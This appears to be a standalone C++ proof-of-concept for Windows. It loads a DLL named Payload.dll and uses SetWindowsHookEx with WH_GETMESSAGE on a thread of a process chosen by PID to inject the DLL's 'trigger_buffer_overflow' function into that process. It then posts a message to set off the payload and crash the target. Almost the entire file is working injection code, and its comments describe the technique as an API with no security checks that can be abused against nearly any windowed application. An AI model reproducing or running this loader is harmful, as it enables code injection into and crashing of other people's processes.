#include <iostream>
#include <process.h>
#include <windows.h>
#include <TlHelp32.h>

//typedef our external payload function
typedef int (__cdecl *trigger_buffer_overflow)();

DWORD get_thread_id(DWORD pid)
{
    HANDLE hsnap;
    THREADENTRY32 pt;
    hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    pt.dwSize = sizeof(THREADENTRY32);
    while (Thread32Next(hsnap, &pt))
    {
        if (pt.th32OwnerProcessID == pid)
        {
            DWORD Thpid = pt.th32ThreadID;
            CloseHandle(hsnap);
            return Thpid;
        }
    };
    CloseHandle(hsnap);
    return 0;
}

int main(int argc, char* argv[])
{
    HHOOK hproc;

    // Load our payload
    HMODULE payload = LoadLibraryA("Payload.dll");

    // Get the address of our buffer overflow function
    HOOKPROC cbt = (HOOKPROC)GetProcAddress(payload, "trigger_buffer_overflow");

    // User input for the target process ID
    DWORD pid;
    std::cout << "Enter PID: " << std::flush && std::cin >> pid;
    std::cout << "Target PID: " << pid << std::endl;

    // Get the Thread ID of the target proc.
    DWORD thread_id = get_thread_id(pid);

    std::cout << "Press enter to trigger the exploit and let the target crash." << std::endl;
    std::cin.get();

    /** This is where the initial exploit happens.
     *  From the official windows documentation:
     * "Installs an application-defined hook procedure into a hook chain.
     *  You would install a hook procedure to monitor the system for certain types of events."
     *
     *  The funny part is that there are no security checks for this. You can abuse this for basically any application
     *  that sets a WNDPROC.
     *
     *  The payload is being executed once the hook procedure is being triggered. The different types can be found at the
     *  official microsoft documentation: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
     *
     *  For this case, we set the hook procedure to listen for any message (WH_GETMESSAGE) and trigger it by sending one through PostThreadMessageA.
     */

    hproc = SetWindowsHookEx(WH_GETMESSAGE, cbt, payload, thread_id);
    PostThreadMessageA(thread_id, WM_NULL, 0, 0);

    if (hproc)
    {
        std::cout << "Application crashed!" << std::endl;
    }
    std::cin.get();
    return 0;
}
